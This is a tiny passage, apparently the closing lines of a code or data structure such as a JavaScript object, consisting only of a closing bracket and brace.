  ]
};